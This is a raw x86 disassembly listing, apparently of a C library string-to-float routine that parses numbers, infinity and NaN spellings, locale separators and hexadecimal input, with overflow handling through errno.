push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x11c
mov ecx, dword [arg_10h]
mov eax, dword [arg_14h]
mov dword [var_64h], 0xa
mov dword [var_8ch], 0
test ecx, ecx
mov edx, dword [eax + 4]
je 0x80862d6
mov ecx, dword [edx + 0x2c]
mov dword [var_90h], ecx
movzx eax, byte [ecx]
test al, al
jle 0x80862d6
cmp al, 0x7f
je 0x80862d6
mov esi, dword [edx + 0x28]
mov dword [var_8ch], esi
cmp byte [esi], 0
jne 0x80862e0
mov dword [var_8ch], 0
mov dword [var_90h], 0
mov edx, dword [edx + 0x24]
mov dword [var_88h], edx
mov dword [esp], edx
call fcn.08053400
mov edi, dword [arg_8h]
mov dword [var_6ch], 0
mov dword [var_94h], eax
mov dword [var_58h], 0
mov dword [var_60h], 0
mov eax, dword [arg_14h]
dec edi
mov edx, dword [eax + 0x34]
inc edi
movzx esi, byte [edi]
mov ecx, esi
movsx eax, cl
test byte [edx + eax*2 + 1], 0x20
jne 0x8086316
cmp cl, 0x2d
je 0x8087bd8
cmp cl, 0x2b
je 0x8087bcf
mov edx, dword [var_88h]
xor ebx, ebx
movzx edx, byte [edx]
test dl, dl
mov byte [var_fdh], dl
mov byte [var_edh], dl
je 0x8087bc4
mov eax, edx
lea esi, [esi]
cmp byte [ebx + edi], al
jne 0x8087bb7
mov ecx, dword [var_88h]
inc ebx
movzx eax, byte [ebx + ecx]
test al, al
jne 0x8086360
movzx eax, byte [ebx + edi]
cmp al, 0x2f
jle 0x8086388
cmp al, 0x39
jle 0x8086524
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x8086524
mov ecx, esi
mov esi, dword [arg_14h]
movsx eax, cl
mov ebx, eax
mov ecx, dword [esi + 0x38]
cmp dword [ecx + eax*4], 0x69
je 0x80864b0
cmp dword [ecx + ebx*4], 0x6e
jne 0x8086497
mov ecx, dword [arg_14h]
mov dword [var_8h], 3
mov dword [var_4h], 0x80a0fb8
mov dword [esp], edi
mov dword [var_ch], ecx
call fcn.0808dd40
test eax, eax
jne 0x8086497
add edi, 3
mov esi, 0x7fc00000
cmp byte [edi], 0x28
je 0x808640d
mov eax, dword [arg_ch]
test eax, eax
je 0x80863f4
mov eax, dword [arg_ch]
mov dword [eax], edi
mov eax, esi
mov dword [var_104h], eax
fld dword [ebp - 0x104]
add esp, 0x11c
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [arg_14h]
mov ebx, edi
mov ecx, dword [eax + 0x38]
inc edi
movzx edx, byte [edi]
lea eax, [edx - 0x30]
cmp al, 9
jbe 0x8086415
movsx eax, dl
mov eax, dword [ecx + eax*4]
cmp eax, 0x60
jle 0x8086430
cmp eax, 0x7a
jle 0x8086415
cmp dl, 0x5f
je 0x8086415
cmp dl, 0x29
je 0x808643e
mov edi, ebx
jmp 0x80863e8
mov edx, dword [arg_14h]
lea eax, [var_50h]
mov dword [var_ch], 0
mov dword [var_4h], eax
mov dword [var_8h], 0
lea eax, [ebx + 1]
mov dword [esp], eax
mov dword [var_10h], edx
call fcn.080856c0
cmp dword [var_50h], edi
mov ecx, eax
jne 0x80863e8
xor edx, edx
and eax, 0x7fffff
mov esi, edx
or esi, eax
jne 0x8086484
mov ecx, 0x400000
mov eax, ecx
and eax, 0x7fffff
or eax, 0x7f800000
mov esi, eax
jmp 0x80863e8
mov eax, dword [arg_ch]
test eax, eax
je 0x80864a6
mov ecx, dword [arg_8h]
mov edx, dword [arg_ch]
mov dword [edx], ecx
mov eax, 0
jmp 0x80863f6
mov dword [var_ch], esi
mov dword [var_8h], 3
mov dword [var_4h], 0x80a0fc0
mov dword [esp], edi
call fcn.0808dd40
test eax, eax
jne 0x8086519
mov edx, dword [arg_ch]
test edx, edx
je 0x8086503
lea ebx, [edi + 3]
mov dword [var_ch], esi
mov dword [var_8h], 5
mov dword [esp], ebx
mov dword [var_4h], str.inity
call fcn.0808dd40
test eax, eax
lea edx, [edi + 8]
mov eax, dword [arg_ch]
cmove ebx, edx
mov dword [eax], ebx
mov ecx, dword [var_60h]
mov eax, 0x7f800000
test ecx, ecx
cmovne eax, dword [0x80a6100]
jmp 0x80863f6
mov edx, dword [arg_14h]
mov ecx, dword [edx + 0x38]
jmp 0x80863aa
mov eax, esi
cmp al, 0x30
je 0x8087b87
mov eax, dword [var_8ch]
mov dword [var_74h], edi
test eax, eax
je 0x8087b6d
mov ecx, dword [var_8ch]
movzx edx, byte [ecx]
mov eax, esi
cmp al, 0x30
je 0x8086576
xor ebx, ebx
test dl, dl
je 0x8087b5f
mov ecx, dword [var_8ch]
movzx eax, byte [ecx]
mov ecx, esi
cmp cl, al
jne 0x8086580
mov ecx, dword [var_8ch]
inc ebx
movzx eax, byte [ebx + ecx]
test al, al
jne 0x8086561
inc edi
movzx esi, byte [edi]
jmp 0x8086548
lea esi, [esi]
test al, al
je 0x8086576
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x8086595
cmp dword [var_64h], 0x10
je 0x8087b0e
mov dword [var_70h], edi
mov dword [var_7ch], 0
nop
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x8087b06
cmp dword [var_64h], 0x10
je 0x8087ae6
mov eax, dword [var_8ch]
test eax, eax
je 0x80865f0
mov ecx, dword [var_8ch]
xor ebx, ebx
movzx eax, byte [ecx]
test al, al
je 0x8087ad8
cmp al, byte [ebx + edi]
jne 0x80865ec
mov edx, dword [var_8ch]
inc ebx
movzx eax, byte [ebx + edx]
test al, al
jne 0x80865d2
inc edi
movzx esi, byte [edi]
jmp 0x80865a0
test al, al
je 0x80865e6
mov eax, dword [var_90h]
test eax, eax
je 0x80877c3
mov eax, dword [var_7ch]
test eax, eax
jle 0x80877c3
mov ecx, dword [var_74h]
mov eax, dword [var_90h]
mov dword [var_4h], edi
mov edx, dword [var_8ch]
mov dword [esp], ecx
mov dword [var_ch], eax
mov dword [var_8h], edx
call fcn.08049980
cmp edi, eax
mov ecx, eax
je 0x80877b4
cmp eax, dword [var_74h]
je 0x808779c
cmp eax, dword [var_70h]
jb 0x808778c
mov ecx, dword [var_70h]
mov edi, eax
mov dword [var_7ch], 0
cmp ecx, eax
jae 0x8086670
movzx eax, byte [ecx]
mov edx, dword [var_7ch]
inc edx
sub eax, 0x30
cmp al, 9
cmova edx, dword [var_7ch]
inc ecx
cmp ecx, edi
mov dword [var_7ch], edx
jb 0x8086658
mov ecx, dword [var_7ch]
mov dword [var_84h], 0
mov dword [var_80h], ecx
mov ebx, dword [arg_ch]
test ebx, ebx
je 0x808668c
mov edx, dword [arg_ch]
mov dword [edx], edi
mov ecx, dword [var_7ch]
test ecx, ecx
jne 0x80866a9
mov edx, dword [var_60h]
mov eax, 0
test edx, edx
cmovne eax, dword [0x80a6104]
jmp 0x80863f6
mov eax, dword [var_84h]
test eax, eax
je 0x8086743
mov ecx, dword [var_88h]
mov esi, dword [var_88h]
movzx ecx, byte [ecx]
mov byte [var_fdh], cl
movzx edx, byte [esi + 1]
mov ecx, dword [var_70h]
movzx eax, byte [var_fdh]
cmp byte [ecx], al
je 0x80866e3
inc dword [var_70h]
jmp 0x80866d0
test dl, dl
mov ebx, 1
je 0x8087780
mov esi, dword [var_88h]
movzx eax, byte [esi + 1]
mov ecx, dword [var_70h]
cmp al, byte [ebx + ecx]
jne 0x8087771
mov esi, dword [var_88h]
inc ebx
movzx eax, byte [ebx + esi]
test al, al
jne 0x80866fa
mov eax, dword [var_84h]
add eax, dword [var_94h]
add dword [var_70h], eax
cmp dword [var_64h], 0x10
je 0x808775e
mov edx, dword [var_58h]
sub edx, dword [var_84h]
mov esi, dword [var_84h]
mov dword [var_58h], edx
sub dword [var_7ch], esi
cmp dword [var_64h], 0x10
je 0x8087597
mov ebx, dword [var_58h]
test ebx, ebx
mov edx, ebx
js 0x8087581
mov eax, dword [var_7ch]
sub eax, dword [var_80h]
cmp ebx, eax
cmovle eax, ebx
add dword [var_80h], eax
mov ebx, edx
sub ebx, eax
mov eax, dword [var_80h]
mov dword [var_58h], ebx
add eax, ebx
cmp eax, 0x27
jg 0x80868b9
cmp ebx, 0xffffffd4
jl 0x8087571
mov esi, dword [var_80h]
test esi, esi
jle 0x8086a28
mov esi, dword [var_88h]
mov edx, dword [var_8ch]
lea eax, [var_58h]
mov ecx, dword [var_94h]
mov dword [var_10h], eax
mov eax, dword [var_70h]
mov dword [var_14h], esi
mov dword [var_1ch], edx
mov esi, dword [var_80h]
mov dword [var_18h], ecx
lea edx, [var_5ch]
mov dword [esp], eax
lea ecx, [var_2ch]
mov dword [var_ch], edx
mov dword [var_8h], ecx
mov dword [var_4h], esi
call fcn.08086060
mov ebx, dword [var_58h]
mov dword [var_70h], eax
test ebx, ebx
jle 0x808689f
lea edx, [var_2ch]
lea ecx, [var_4ch]
mov edi, 1
mov dword [var_a0h], edx
mov dword [var_a4h], ecx
mov dword [var_a8h], 0x80a7020
test edi, ebx
je 0x808687f
mov eax, dword [var_a8h]
mov edx, dword [var_5ch]
xor ebx, edi
mov dword [var_58h], ebx
mov esi, dword [eax + 4]
sub esi, 2
cmp edx, esi
jl 0x8087542
mov dword [var_10h], esi
mov eax, dword [eax]
mov dword [var_8h], edx
mov edx, dword [var_a4h]
lea eax, [eax*4 + 0x80a6248]
mov dword [var_ch], eax
mov dword [esp], edx
mov eax, dword [var_a0h]
mov dword [var_4h], eax
call fcn.0808c7c0
mov edx, eax
mov eax, dword [var_5ch]
add eax, esi
test edx, edx
mov dword [var_5ch], eax
jne 0x8086864
dec eax
mov dword [var_5ch], eax
mov eax, dword [var_a0h]
mov esi, dword [var_a4h]
mov ebx, dword [var_58h]
mov dword [var_a0h], esi
mov dword [var_a4h], eax
add edi, edi
add dword [var_a8h], 0x10
test ebx, ebx
jne 0x8086805
lea eax, [var_4ch]
cmp dword [var_a0h], eax
je 0x808752c
mov esi, dword [var_5ch]
bsr edx, dword [ebp + esi*4 - 0x30]
xor edx, 0x1f
mov eax, esi
shl eax, 5
sub eax, edx
mov dword [var_6ch], eax
add eax, 0xffffff80
jle 0x80868c9
call fcn.08048b20
mov dword [eax], 0x22
jmp 0x8086503
cmp dword [var_6ch], 0x18
jle 0x8086a09
mov edx, dword [var_6ch]
mov eax, dword [var_6ch]
mov dword [var_b4h], 0x1f
add edx, 7
sub eax, 0x18
mov edi, eax
cmovs edi, edx
sar edi, 5
mov edx, edi
lea ecx, [edi - 1]
shl edx, 5
sub eax, edx
mov dword [var_ach], eax
cmovne ecx, edi
mov edx, dword [var_ach]
dec eax
mov dword [var_b0h], ecx
test edx, edx
cmove eax, dword [var_b4h]
mov dword [var_b4h], eax
jne 0x8086999
mov eax, dword [ebp + edi*4 - 0x2c]
mov dword [var_54h], eax
mov eax, dword [var_2ch]
xor ebx, ebx
test eax, eax
jne 0x808693b
inc ebx
mov eax, dword [ebp + ebx*4 - 0x2c]
test eax, eax
je 0x8086932
xor eax, eax
mov esi, dword [var_7ch]
cmp dword [var_80h], esi
jl 0x808694d
cmp ebx, dword [var_b0h]
jge 0x8086952
mov eax, 1
mov dword [var_14h], eax
mov edx, dword [var_b0h]
mov ecx, dword [var_60h]
mov eax, dword [var_b4h]
mov dword [var_8h], ecx
mov dword [var_10h], eax
mov eax, dword [ebp + edx*4 - 0x2c]
mov dword [var_ch], eax
mov eax, dword [var_6ch]
dec eax
mov dword [var_4h], eax
lea esi, [var_54h]
mov dword [esp], esi
call fcn.08085e00
fstp dword [ebp - 0x104]
mov eax, dword [var_104h]
jmp 0x80863f6
lea eax, [esi - 1]
mov ebx, edi
cmp edi, eax
jge 0x80869eb
mov dword [var_108h], 0x20
mov ecx, dword [var_ach]
mov dword [var_b8h], eax
sub dword [var_108h], ecx
lea esi, [var_54h]
movzx ecx, byte [var_ach]
mov edx, dword [ebp + ebx*4 - 0x2c]
mov eax, dword [ebp + ebx*4 - 0x28]
inc ebx
shr edx, cl
movzx ecx, byte [var_108h]
shl eax, cl
or edx, eax
mov dword [esi], edx
add esi, 4
cmp ebx, dword [var_b8h]
jl 0x80869c1
mov eax, ebx
sub eax, edi
test eax, eax
jg 0x8086929
movzx ecx, byte [var_ach]
mov eax, dword [ebp + ebx*4 - 0x2c]
shr eax, cl
jmp 0x8086926
mov eax, dword [var_80h]
cmp dword [var_7ch], eax
je 0x8087413
lea ecx, [esi*4]
lea edi, [var_54h]
lea esi, [var_2ch]
cld
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
mov esi, 0x1a
lea eax, [var_4ch]
lea edx, [var_2ch]
sub esi, dword [var_6ch]
mov dword [var_c8h], eax
mov dword [var_cch], edx
mov edx, 0x55555556
mov ecx, dword [var_7ch]
mov dword [var_d0h], 0x80a7020
sub ecx, dword [var_80h]
mov dword [var_c4h], 0
mov eax, esi
imul edx
mov eax, esi
sar eax, 0x1f
sub edx, eax
lea eax, [edx + 2]
cmp ecx, eax
jle 0x8086a87
mov ecx, dword [var_80h]
mov dword [var_c4h], 1
lea edx, [edx + ecx + 2]
mov dword [var_7ch], edx
mov esi, dword [var_7ch]
mov dword [var_68h], 0
sub esi, dword [var_80h]
sub esi, ebx
mov ebx, 1
mov dword [var_c0h], esi
test dword [var_c0h], ebx
je 0x8086ae3
mov eax, dword [var_68h]
xor dword [var_c0h], ebx
test eax, eax
jne 0x80873a0
mov eax, dword [var_d0h]
mov edi, dword [var_c8h]
cld
mov edx, dword [eax + 4]
mov esi, dword [eax]
sub edx, 2
lea esi, [esi*4 + 0x80a6248]
mov ecx, edx
mov dword [var_68h], edx
shl ecx, 2
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
mov eax, dword [var_c0h]
add ebx, ebx
add dword [var_d0h], 0x10
test eax, eax
jne 0x8086aa1
lea eax, [var_2ch]
cmp dword [var_c8h], eax
je 0x808738a
mov edx, dword [var_8ch]
mov esi, dword [var_88h]
lea eax, [var_58h]
mov ecx, dword [var_94h]
mov dword [var_10h], eax
mov dword [var_1ch], edx
mov dword [var_14h], esi
lea edx, [var_5ch]
mov esi, dword [var_80h]
mov dword [var_ch], edx
mov dword [var_18h], ecx
sub dword [var_7ch], esi
mov edx, dword [var_70h]
lea ecx, [var_2ch]
mov eax, dword [var_7ch]
mov dword [var_8h], ecx
mov dword [esp], edx
mov dword [var_4h], eax
call fcn.08086060
mov ecx, dword [var_68h]
bsr eax, dword [ebp + ecx*4 - 0x50]
mov ebx, eax
xor ebx, 0x1f
jle 0x8086ba1
lea esi, [var_4ch]
mov dword [var_8h], ecx
mov dword [var_ch], ebx
mov dword [var_4h], esi
mov dword [esp], esi
call fcn.0808c6f0
mov eax, dword [var_5ch]
lea edx, [var_2ch]
mov dword [var_ch], ebx
mov dword [var_4h], edx
mov dword [esp], edx
mov dword [var_8h], eax
call fcn.0808c6f0
test eax, eax
mov edx, eax
je 0x8086ba1
mov eax, dword [var_5ch]
mov dword [ebp + eax*4 - 0x2c], edx
inc eax
mov dword [var_5ch], eax
cmp dword [var_68h], 1
mov esi, dword [var_6ch]
mov dword [var_58h], esi
je 0x8087273
cmp dword [var_68h], 2
je 0x8086fef
mov eax, dword [var_68h]
mov ecx, dword [var_68h]
mov dword [var_e8h], 0
xor edi, edi
mov edx, dword [ebp + eax*4 - 0x54]
mov esi, dword [ebp + eax*4 - 0x50]
mov eax, dword [var_5ch]
mov dword [var_e4h], edx
sub ecx, eax
mov dword [var_8h], eax
lea eax, [ebp + ecx*4 - 0x4c]
mov dword [var_4h], eax
lea eax, [var_2ch]
mov dword [esp], eax
call fcn.0808c330
test eax, eax
jle 0x8086c0a
mov eax, dword [var_5ch]
mov dword [ebp + eax*4 - 0x2c], 0
inc eax
mov dword [var_5ch], eax
mov edx, dword [var_5ch]
cmp edx, dword [var_68h]
jge 0x8086fd5
mov ecx, dword [var_68h]
mov eax, dword [var_6ch]
sub ecx, edx
test eax, eax
mov dword [var_ech], ecx
jle 0x8086f8a
mov eax, dword [var_ech]
shl eax, 5
add eax, dword [var_6ch]
cmp eax, 0x18
jg 0x8086ed6
test edx, edx
mov dword [var_54h], 0
mov ecx, edx
jle 0x8086c64
mov eax, dword [var_ech]
lea edx, [eax + ecx]
mov eax, dword [ebp + ecx*4 - 0x30]
dec ecx
test ecx, ecx
mov dword [ebp + edx*4 - 0x2c], eax
jg 0x8086c4e
mov edx, dword [var_ech]
xor eax, eax
inc edx
cmp eax, edx
jge 0x8086c7e
mov dword [ebp + eax*4 - 0x2c], 0
inc eax
cmp eax, edx
jl 0x8086c71
shl dword [var_ech], 5
mov edx, dword [var_ech]
add dword [var_6ch], edx
mov eax, dword [var_68h]
cmp dword [var_6ch], 0x18
mov dword [ebp + eax*4 - 0x4c], 0
mov edx, eax
mov eax, dword [ebp + eax*4 - 0x2c]
mov ebx, eax
jg 0x8086ddb
lea ecx, [edx + 1]
lea eax, [edx - 1]
mov dword [var_f8h], ecx
mov dword [var_f4h], eax
cmp ebx, esi
mov edi, 0xffffffff
je 0x8086d0f
mov edx, dword [var_68h]
mov eax, dword [ebp + edx*4 - 0x30]
mov edx, ebx
div esi
mov ecx, edx
mov edi, eax
mov eax, dword [var_e4h]
mul edi
cmp edx, ecx
mov ebx, eax
jbe 0x8086ebe
add ecx, esi
dec edi
cmp ecx, esi
jb 0x8086d0f
cmp ebx, dword [var_e4h]
lea eax, [edx - 1]
cmovb edx, eax
sub ebx, dword [var_e4h]
cmp edx, ecx
ja 0x8086ce7
jne 0x8086d0f
mov eax, dword [var_68h]
cmp ebx, dword [ebp + eax*4 - 0x34]
ja 0x8086ce7
mov edx, dword [var_f8h]
lea ecx, [var_4ch]
lea eax, [var_2ch]
mov dword [var_ch], edi
mov dword [var_4h], ecx
mov dword [esp], eax
mov dword [var_8h], edx
call fcn.0808d600
mov edx, dword [var_68h]
cmp dword [ebp + edx*4 - 0x2c], eax
je 0x8086d53
lea eax, [var_2ch]
lea ecx, [var_4ch]
mov dword [var_ch], edx
mov dword [var_8h], ecx
mov dword [var_4h], eax
mov dword [esp], eax
dec edi
call fcn.0808c2a0
mov ecx, dword [var_68h]
mov edx, dword [var_f4h]
mov eax, dword [ebp + ecx*4 - 0x30]
test edx, edx
mov dword [ebp + ecx*4 - 0x2c], eax
mov ebx, eax
jle 0x8086d77
mov eax, dword [ebp + edx*4 - 0x30]
mov dword [ebp + edx*4 - 0x2c], eax
dec edx
test edx, edx
jg 0x8086d6a
mov eax, dword [var_6ch]
test eax, eax
jne 0x8086e4c
test edi, edi
mov edx, 0x20
je 0x8086d91
bsr edx, edi
xor edx, 0x1f
mov ecx, 0x20
sub dword [var_58h], edx
mov eax, ecx
sub eax, edx
cmp eax, 0x18
jle 0x8086e39
add edx, 0x18
mov eax, edi
mov dword [var_fch], 0x39
sub ecx, edx
mov dword [var_e8h], edx
shr eax, cl
mov dword [var_54h], eax
mov ecx, dword [var_fch]
cmp ecx, 0x18
mov dword [var_6ch], ecx
jle 0x8086cbd
mov esi, dword [var_68h]
mov eax, dword [ebp + esi*4 - 0x2c]
test eax, eax
mov edx, dword [var_68h]
jne 0x8086df3
test edx, edx
js 0x8086df3
dec edx
mov ebx, dword [ebp + edx*4 - 0x2c]
test ebx, ebx
jne 0x8086df3
test edx, edx
jns 0x8086de6
mov ecx, dword [var_c4h]
xor eax, eax
test ecx, ecx
jne 0x8086e03
test edx, edx
js 0x8086e08
mov eax, 1
mov dword [var_14h], eax
lea edx, [var_54h]
mov dword [var_ch], edi
mov eax, 0x1f
mov dword [esp], edx
sub eax, dword [var_e8h]
mov dword [var_10h], eax
mov eax, dword [var_60h]
mov dword [var_8h], eax
mov eax, dword [var_58h]
dec eax
mov dword [var_4h], eax
jmp 0x8086983
neg edx
mov dword [var_54h], edi
add edx, 0x20
mov dword [var_fch], edx
jmp 0x8086dc2
mov eax, dword [var_6ch]
add eax, 0x20
cmp eax, 0x18
mov dword [var_fch], eax
jg 0x8086e65
mov dword [var_54h], edi
jmp 0x8086dc2
mov dword [var_e8h], 0x18
mov edx, dword [var_6ch]
sub dword [var_e8h], edx
mov eax, dword [var_e8h]
test eax, eax
jle 0x8086dc2
mov ecx, dword [var_e8h]
lea eax, [var_54h]
mov dword [var_8h], 1
mov dword [var_4h], eax
mov dword [esp], eax
mov dword [var_ch], ecx
call fcn.0808c6f0
mov eax, edi
mov ecx, 0x20
sub ecx, dword [var_e8h]
shr eax, cl
or dword [var_54h], eax
jmp 0x8086dc2
jne 0x8086d0f
mov eax, dword [var_68h]
cmp ebx, dword [ebp + eax*4 - 0x34]
ja 0x8086ce7
jmp 0x8086d0f
mov dword [var_e8h], 0x18
mov edx, dword [var_6ch]
sub dword [var_e8h], edx
cmp dword [var_e8h], 0x1f
jle 0x8086f56
mov ebx, dword [var_e8h]
mov ecx, dword [var_e8h]
mov dword [var_8h], 1
add ebx, 0x1f
cmp dword [var_e8h], 0xffffffff
cmovg ebx, dword [var_e8h]
sar ebx, 5
mov eax, ebx
shl eax, 5
sub ecx, eax
lea eax, [var_54h]
mov dword [var_4h], eax
mov dword [var_ch], ecx
lea eax, [ebp + ebx*4 - 0x54]
mov dword [esp], eax
call fcn.0808c6f0
mov eax, ebx
dec eax
js 0x8086c7e
lea edx, [ebp + eax*4 - 0x54]
mov dword [edx], 0
sub edx, 4
dec eax
jns 0x8086f45
jmp 0x8086c7e
mov eax, dword [var_e8h]
test eax, eax
jle 0x8086c7e
mov edx, dword [var_e8h]
lea ecx, [var_54h]
mov dword [var_8h], 1
mov dword [var_4h], ecx
mov dword [esp], ecx
mov dword [var_ch], edx
call fcn.0808c6f0
jmp 0x8086c7e
test edx, edx
mov ecx, edx
jle 0x8086fa6
mov eax, dword [var_ech]
lea edx, [eax + ecx]
mov eax, dword [ebp + ecx*4 - 0x30]
dec ecx
test ecx, ecx
mov dword [ebp + edx*4 - 0x2c], eax
jg 0x8086f90
mov edx, dword [var_ech]
xor eax, eax
inc edx
cmp eax, edx
jge 0x8086fc0
mov dword [ebp + eax*4 - 0x2c], 0
inc eax
cmp eax, edx
jl 0x8086fb3
shl dword [var_ech], 5
mov edx, dword [var_ech]
sub dword [var_58h], edx
jmp 0x8086c8e
test edx, edx
jle 0x8086c8e
mov eax, dword [ebp + edx*4 - 0x30]
mov dword [ebp + edx*4 - 0x2c], eax
dec edx
test edx, edx
jg 0x8086fdd
jmp 0x8086c8e
cmp dword [var_5ch], 1
mov eax, dword [var_48h]
mov dword [var_dch], 0
mov dword [var_e0h], 0
mov edi, dword [var_4ch]
mov dword [var_d8h], eax
jle 0x80871ec
mov esi, dword [var_28h]
mov ebx, dword [var_2ch]
cmp dword [var_6ch], 0x18
jg 0x80870e1
cmp esi, dword [var_d8h]
je 0x80871b8
mov eax, ebx
mov edx, esi
div dword [var_d8h]
mov ecx, edx
mov dword [var_dch], eax
mul edi
mov esi, edx
mov ebx, eax
cmp esi, ecx
ja 0x8087057
jne 0x8087070
test ebx, ebx
je 0x8087070
add ecx, dword [var_d8h]
dec dword [var_dch]
sub ebx, edi
sbb esi, 0
cmp ecx, dword [var_d8h]
jae 0x808704d
xor eax, eax
sub eax, ebx
sbb ecx, esi
mov esi, ecx
mov ebx, eax
mov eax, dword [var_6ch]
test eax, eax
jne 0x808713c
mov eax, dword [var_dch]
mov edx, 0x20
test eax, eax
je 0x808709e
bsr edx, dword [var_dch]
xor edx, 0x1f
mov ecx, 0x20
sub dword [var_58h], edx
mov eax, ecx
sub eax, edx
cmp eax, 0x18
jle 0x8087126
mov eax, dword [ebp - 0xdc]
add edx, 0x18
mov dword [ebp - 0xfc], 0x39
sub ecx, edx
mov dword [ebp - 0xe0], edx
shr eax, cl
mov dword [ebp - 0x54], eax
mov eax, dword [ebp - 0xfc]
cmp eax, 0x18
mov dword [ebp - 0x6c], eax
jle 0x8087029
mov edx, dword [var_c4h]
xor eax, eax
test edx, edx
jne 0x80870f5
test esi, esi
jne 0x80870f5
test ebx, ebx
je 0x80870fa
mov eax, 1
mov dword [var_14h], eax
mov edx, dword [var_dch]
mov eax, 0x1f
sub eax, dword [var_e0h]
mov dword [var_ch], edx
mov dword [var_10h], eax
mov ecx, dword [var_60h]
mov eax, dword [var_58h]
mov dword [var_8h], ecx
jmp 0x8086978
mov ecx, dword [ebp - 0xdc]
neg edx
add edx, 0x20
mov dword [ebp - 0xfc], edx
mov dword [ebp - 0x54], ecx
jmp 0x80870cf
mov eax, dword [var_6ch]
add eax, 0x20
cmp eax, 0x18
mov dword [var_fch], eax
jg 0x808715b
mov edx, dword [var_dch]
mov dword [var_54h], edx
jmp 0x80870cf
mov dword [var_e0h], 0x18
mov ecx, dword [var_6ch]
sub dword [var_e0h], ecx
mov ecx, dword [var_e0h]
test ecx, ecx
jle 0x80870cf
mov eax, dword [ebp - 0xe0]
lea edx, [ebp - 0x54]
mov dword [esp + 8], 1
mov dword [esp + 4], edx
mov dword [esp], edx
mov dword [esp + 0xc], eax
call fcn.0808c6f0
mov eax, dword [ebp - 0xdc]
mov ecx, 0x20
sub ecx, dword [ebp - 0xe0]
shr eax, cl
or dword [ebp - 0x54], eax
jmp 0x80870cf
lea ecx, [esi + ebx]
mov dword [var_dch], 0xffffffff
cmp ecx, esi
jb 0x80871dc
test edi, edi
mov esi, edi
lea eax, [edi - 1]
mov ebx, edi
cmovne esi, eax
neg ebx
jmp 0x808704d
sub ecx, edi
xor ebx, ebx
mov esi, ecx
add ebx, edi
adc esi, 0
jmp 0x808707a
mov eax, dword [var_2ch]
cmp eax, dword [var_d8h]
jb 0x8087200
xor esi, esi
mov ebx, eax
jmp 0x808701f
mov ecx, dword [var_6ch]
test ecx, ecx
jle 0x8087268
mov ebx, dword [var_6ch]
add ebx, 0x20
cmp ebx, 0x18
jg 0x8087225
mov dword [var_54h], 0
mov dword [var_6ch], ebx
mov esi, eax
xor ebx, ebx
jmp 0x808701f
mov dword [var_e0h], 0x18
mov edx, dword [var_6ch]
sub dword [var_e0h], edx
mov edx, dword [var_e0h]
test edx, edx
jle 0x8087219
mov ecx, dword [var_e0h]
lea esi, [var_54h]
mov dword [var_8h], 1
mov dword [var_4h], esi
mov dword [esp], esi
mov dword [var_ch], ecx
call fcn.0808c6f0
mov eax, dword [var_2ch]
jmp 0x8087219
mov ebx, dword [var_6ch]
sub ebx, 0x20
mov dword [var_58h], ebx
jmp 0x808721c
mov dword [var_d4h], 0
mov ebx, dword [var_2ch]
mov edi, dword [var_4ch]
xor eax, eax
mov edx, ebx
div edi
mov esi, eax
mov ebx, edx
mov eax, dword [var_6ch]
test eax, eax
jne 0x808731f
test esi, esi
mov edx, 0x20
je 0x80872a7
bsr edx, esi
xor edx, 0x1f
mov ecx, 0x20
sub dword [var_58h], edx
mov eax, ecx
sub eax, edx
cmp eax, 0x18
jle 0x808730f
add edx, 0x18
mov eax, esi
mov dword [var_fch], 0x39
sub ecx, edx
mov dword [var_d4h], edx
shr eax, cl
mov dword [var_54h], eax
mov edx, dword [var_fch]
cmp edx, 0x18
mov dword [var_6ch], edx
jle 0x8087283
mov edi, dword [var_c4h]
xor eax, eax
test edi, edi
jne 0x80872f2
test ebx, ebx
je 0x80872f7
mov eax, 1
mov dword [var_14h], eax
mov dword [var_ch], esi
mov eax, 0x1f
sub eax, dword [var_d4h]
jmp 0x8087113
neg edx
mov dword [var_54h], esi
add edx, 0x20
mov dword [var_fch], edx
jmp 0x80872d4
mov ecx, dword [var_6ch]
add ecx, 0x20
cmp ecx, 0x18
mov dword [var_fch], ecx
jg 0x8087335
mov dword [var_54h], esi
jmp 0x80872d4
mov dword [var_d4h], 0x18
mov eax, dword [var_6ch]
sub dword [var_d4h], eax
mov eax, dword [var_d4h]
test eax, eax
jle 0x80872d4
mov edx, dword [var_d4h]
lea ecx, [var_54h]
mov dword [var_8h], 1
mov dword [var_4h], ecx
mov dword [esp], ecx
mov dword [var_ch], edx
call fcn.0808c6f0
mov eax, esi
mov ecx, 0x20
sub ecx, dword [var_d4h]
shr eax, cl
or dword [var_54h], eax
jmp 0x80872d4
mov ecx, dword [var_68h]
lea edi, [var_4ch]
mov esi, eax
cld
shl ecx, 2
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
jmp 0x8086b05
mov edx, dword [var_d0h]
mov ecx, dword [var_68h]
mov esi, dword [var_c8h]
mov dword [var_10h], ecx
mov ecx, dword [var_cch]
mov dword [var_ch], esi
mov eax, dword [edx + 4]
sub eax, 2
mov dword [var_8h], eax
mov eax, dword [edx]
mov dword [esp], ecx
lea eax, [eax*4 + 0x80a6248]
mov dword [var_4h], eax
call fcn.0808c7c0
mov edi, dword [var_c8h]
mov esi, dword [var_d0h]
mov edx, dword [var_68h]
add edx, dword [esi + 4]
mov esi, dword [var_cch]
mov dword [var_cch], edi
mov dword [var_c8h], esi
lea ecx, [edx - 2]
sub edx, 3
test eax, eax
cmovne edx, ecx
mov dword [var_68h], edx
jmp 0x8086ae3
mov eax, dword [var_6ch]
mov edx, dword [var_6ch]
add eax, 0x1e
dec edx
cmovns eax, edx
mov dword [var_bch], edx
and eax, 0xffffffe0
sub edx, eax
cmp edx, 0x17
je 0x80874f0
cmp edx, 0x16
jg 0x80874aa
mov eax, 0x17
mov ebx, 1
lea ecx, [var_2ch]
sub eax, edx
mov dword [var_8h], esi
mov dword [var_4h], ecx
mov dword [var_ch], eax
mov eax, ebx
sub eax, esi
lea eax, [ebp + eax*4 - 0x54]
mov dword [esp], eax
call fcn.0808c6f0
mov eax, ebx
sub eax, dword [var_5ch]
test eax, eax
jle 0x808747c
lea edx, [var_54h]
mov dword [edx], 0
add edx, 4
dec eax
jne 0x8087470
mov edx, dword [var_60h]
mov ecx, dword [var_bch]
mov dword [var_14h], 0
mov dword [var_10h], 0
mov dword [var_ch], 0
mov dword [var_8h], edx
mov dword [var_4h], ecx
jmp 0x808697d
